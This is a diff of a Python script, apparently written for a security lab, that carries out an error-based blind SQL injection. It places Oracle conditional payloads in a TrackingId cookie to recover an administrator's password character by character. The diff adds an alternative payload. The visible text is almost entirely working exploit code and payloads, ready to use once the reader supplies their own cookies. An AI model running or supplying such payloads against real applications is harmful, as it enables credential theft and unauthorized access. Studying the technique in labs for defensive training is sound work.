@@ -14,6 +14,10 @@ def retrieve_password(url):
     for number in range(1,21): # Test each char position for the passoword(the password length is 20 char).
         for ascii_char in range(33,127): # Try the decimal numbers for each char from the ASCII table.
             payload =f"'||(SELECT CASE WHEN ASCII(SUBSTR(password,{number},1))={ascii_char} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')--"
+            
+            # This is another payload using the 'WHERE' keyword.
+            #payload =f"'||(SELECT TO_CHAR(1/0) FROM users WHERE ASCII(SUBSTR(password,{number},1))={ascii_char} AND username='administrator')--" 
+            
             cookies={ # You must change it and set the cookies of your request.
                 "TrackingId": "YkSwHFRFicSRKULO" + payload 
                 , "session": "LSbZa0aO4BfYPfckjvBc2SOG2p1dExVB"}
